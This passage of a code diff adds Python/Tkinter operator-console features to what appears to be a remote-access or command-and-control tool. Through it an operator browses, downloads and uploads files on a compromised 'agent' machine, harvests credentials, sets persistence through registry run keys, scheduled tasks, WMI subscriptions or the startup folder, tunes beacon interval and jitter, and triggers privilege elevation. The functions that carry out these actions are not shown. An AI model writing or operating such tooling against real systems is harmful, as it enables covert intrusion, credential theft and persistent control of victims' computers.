+            try:
+                file_context_menu.tk_popup(event.x_root, event.y_root)
+            finally:
+                file_context_menu.grab_release()
+        
+        file_tree.bind('<Button-3>', show_file_context)
+        
+        # Double-click to navigate or download
+        def on_double_click(event):
+            selection = file_tree.selection()
+            if not selection:
+                return
+            
+            item = selection[0]
+            values = file_tree.item(item)['values']
+            name = values[0]
+            file_type = values[1]
+            
+            current_path = path_var.get().rstrip('\\\\//')
+            
+            if file_type == 'DIR':
+                # Navigate into directory
+                new_path = f"{current_path}\\{name}"
+                path_var.set(new_path)
+                load_directory(new_path)
+            else:
+                # Download file
+                full_path = f"{current_path}\\{name}"
+                download_file_path(full_path)
+        
+        file_tree.bind('<Double-1>', on_double_click)
+        
+        def go_up():
+            current = path_var.get().rstrip('\\\\//')
+            parent = str(Path(current).parent)
+            if parent and parent != current:
+                path_var.set(parent)
+                load_directory(parent)
+        
+        def load_directory(dir_path):
+            status_var.set(f"Loading {dir_path}...")
+            explorer.update()
+            
+            self.logger.info(f"Loading directory: {dir_path}")
+            
+            # Clear current items
+            for item in file_tree.get_children():
+                file_tree.delete(item)
+            
+            # Fix path format - remove trailing backslash except for root
+            clean_path = dir_path.rstrip('\\\\//')
+            if len(clean_path) == 2 and clean_path[1] == ':':
+                # It's a root like C: - add backslash
+                list_path = clean_path + '\\\\'
+            else:
+                list_path = clean_path
+            
+            self.logger.debug(f"File explorer listing: {list_path}")
+            
+            def list_thread():
+                success, message = self.api.list_directory(
+                    self.context_menu_agent_id,
+                    list_path
+                )
+                
+                if success:
+                    self.logger.info(f"Directory listing sent for {dir_path}")
+                    explorer.after(100, lambda: status_var.set(f"Loaded {dir_path}"))
+                    # The output will come via WebSocket event as __DIRLIST__
+                    # We'll need to parse it when it arrives
+                else:
+                    self.logger.error(f"Failed to list directory: {message}")
+                    explorer.after(0, lambda: status_var.set(f"Error: {message}"))
+            
+            threading.Thread(target=list_thread, daemon=True).start()
+        
+        def download_selected():
+            selection = file_tree.selection()
+            if not selection:
+                return
+            
+            item = selection[0]
+            values = file_tree.item(item)['values']
+            name = values[0]
+            file_type = values[1]
+            
+            if file_type == 'DIR':
+                status_var.set("Cannot download directories")
+                return
+            
+            current_path = path_var.get().rstrip('\\\\//')
+            full_path = f"{current_path}\\{name}"
+            download_file_path(full_path)
+        
+        def download_file_path(file_path):
+            status_var.set(f"Downloading {Path(file_path).name}...")
+            
+            def dl_thread():
+                success, message = self.api.download_file(self.context_menu_agent_id, file_path)
+                if success:
+                    explorer.after(0, lambda: status_var.set(f"Download started: {Path(file_path).name}"))
+                else:
+                    explorer.after(0, lambda: status_var.set(f"Error: {message}"))
+            
+            threading.Thread(target=dl_thread, daemon=True).start()
+        
+        def upload_to_current():
+            local_path = filedialog.askopenfilename(
+                title="Select File to Upload",
+                filetypes=[("All Files", "*.*")]
+            )
+            if not local_path:
+                return
+            
+            current_path = path_var.get().rstrip('\\\\//')
+            remote_path = f"{current_path}\\{Path(local_path).name}"
+            
+            status_var.set(f"Uploading {Path(local_path).name}...")
+            
+            def ul_thread():
+                success, message = self.api.upload_file(
+                    self.context_menu_agent_id, 
+                    local_path, 
+                    remote_path
+                )
+                if success:
+                    explorer.after(0, lambda: status_var.set(f"Upload started: {Path(local_path).name}"))
+                    explorer.after(500, lambda: load_directory(path_var.get()))
+                else:
+                    explorer.after(0, lambda: status_var.set(f"Error: {message}"))
+            
+            threading.Thread(target=ul_thread, daemon=True).start()
+        
+        # Load initial directory
+        load_directory("C:\\")
+        
+        # Cleanup on close
+        def on_close():
+            if self.context_menu_agent_id in self.file_explorer_windows:
+                del self.file_explorer_windows[self.context_menu_agent_id]
+            explorer.destroy()
+        
+        explorer.protocol("WM_DELETE_WINDOW", on_close)
+    
+    def _context_harvest(self):
+        """Harvest credentials from context menu."""
+        if self.context_menu_agent_id:
+            self._harvest_credentials(self.context_menu_agent_id)
+    
+    def _context_persistence(self):
+        """Set persistence from context menu."""
+        if not self.context_menu_agent_id:
+            return
+        
+        # Create dialog for persistence method selection
+        dialog = tk.Toplevel(self.root)
+        dialog.title(f"Set Persistence on Agent {self.context_menu_agent_id}")
+        dialog.geometry("400x250")
+        dialog.configure(bg=self.colors['bg'])
+        dialog.transient(self.root)
+        dialog.grab_set()
+        
+        ttk.Label(dialog, text="Select persistence method:", style='Dark.TLabel',
+                 font=('Consolas', 12, 'bold')).pack(pady=15)
+        
+        method_var = tk.StringVar(value="registry")
+        
+        methods = [
+            ("registry", "Registry Run Key"),
+            ("task", "Scheduled Task"),
+            ("wmi", "WMI Event Subscription"),
+            ("startup", "Startup Folder")
+        ]
+        
+        for value, label in methods:
+            tk.Radiobutton(dialog, text=label, variable=method_var, value=value,
+                          bg=self.colors['bg'], fg=self.colors['fg'], 
+                          selectcolor=self.colors['panel_bg'],
+                          activebackground=self.colors['bg'],
+                          activeforeground=self.colors['accent'],
+                          font=('Consolas', 10)).pack(anchor=tk.W, padx=40, pady=5)
+        
+        def set_persist():
+            method = method_var.get()
+            self._set_persistence(self.context_menu_agent_id, method)
+            dialog.destroy()
+        
+        btn_frame = tk.Frame(dialog, bg=self.colors['bg'])
+        btn_frame.pack(pady=15)
+        
+        tk.Button(btn_frame, text="Set Persistence", bg=self.colors['accent'], fg='white',
+                 relief=tk.FLAT, command=set_persist, padx=20).pack(side=tk.LEFT, padx=5)
+        tk.Button(btn_frame, text="Cancel", bg=self.colors['panel_bg'], fg=self.colors['fg'],
+                 relief=tk.FLAT, command=dialog.destroy, padx=20).pack(side=tk.LEFT, padx=5)
+    
+    def _context_beacon(self):
+        """Configure beacon from context menu."""
+        if not self.context_menu_agent_id:
+            return
+        
+        # Create dialog for beacon configuration
+        dialog = tk.Toplevel(self.root)
+        dialog.title(f"Configure Beacon for Agent {self.context_menu_agent_id}")
+        dialog.geometry("400x200")
+        dialog.configure(bg=self.colors['bg'])
+        dialog.transient(self.root)
+        dialog.grab_set()
+        
+        ttk.Label(dialog, text="Beacon Configuration", style='Dark.TLabel',
+                 font=('Consolas', 12, 'bold')).pack(pady=15)
+        
+        form_frame = tk.Frame(dialog, bg=self.colors['bg'])
+        form_frame.pack(pady=10)
+        
+        ttk.Label(form_frame, text="Interval (seconds):", style='Dark.TLabel').grid(
+            row=0, column=0, sticky='e', padx=5, pady=5)
+        interval_entry = tk.Entry(form_frame, width=15, bg=self.colors['input_bg'], 
+                                 fg=self.colors['fg'])
+        interval_entry.grid(row=0, column=1, padx=5, pady=5)
+        interval_entry.insert(0, "60")
+        
+        ttk.Label(form_frame, text="Jitter (seconds):", style='Dark.TLabel').grid(
+            row=1, column=0, sticky='e', padx=5, pady=5)
+        jitter_entry = tk.Entry(form_frame, width=15, bg=self.colors['input_bg'], 
+                               fg=self.colors['fg'])
+        jitter_entry.grid(row=1, column=1, padx=5, pady=5)
+        jitter_entry.insert(0, "30")
+        
+        def configure():
+            try:
+                interval = int(interval_entry.get().strip())
+                jitter = int(jitter_entry.get().strip())
+                self._configure_beacon(self.context_menu_agent_id, interval, jitter)
+                dialog.destroy()
+            except ValueError:
+                messagebox.showerror("Invalid Input", "Please enter valid numbers")
+        
+        btn_frame = tk.Frame(dialog, bg=self.colors['bg'])
+        btn_frame.pack(pady=15)
+        
+        tk.Button(btn_frame, text="Configure", bg=self.colors['accent'], fg='white',
+                 relief=tk.FLAT, command=configure, padx=20).pack(side=tk.LEFT, padx=5)
+        tk.Button(btn_frame, text="Cancel", bg=self.colors['panel_bg'], fg=self.colors['fg'],
+                 relief=tk.FLAT, command=dialog.destroy, padx=20).pack(side=tk.LEFT, padx=5)
+    
+    def _context_elevate(self):
+        """Elevate agent from context menu."""
+        if self.context_menu_agent_id:
+            # Show confirmation dialog
+            result = messagebox.askyesno(
+                "Elevate to Admin",
+                f"Attempt to elevate Agent {self.context_menu_agent_id} to Administrator?\n\n"
+                "This will trigger a UAC prompt on the target machine.",
+                icon='warning'
+            )
+            if result:
+                self._elevate_agent(self.context_menu_agent_id)
+    
     def _on_close(self):
         """Handle window close."""
+        self.logger.info("Application closing...")
         self.running = False
         self.api.disconnect()
         self.ssh_tunnel.disconnect()
+        self.logger.info("Connections closed. Goodbye!")
         self.root.destroy()
     
     def run(self):
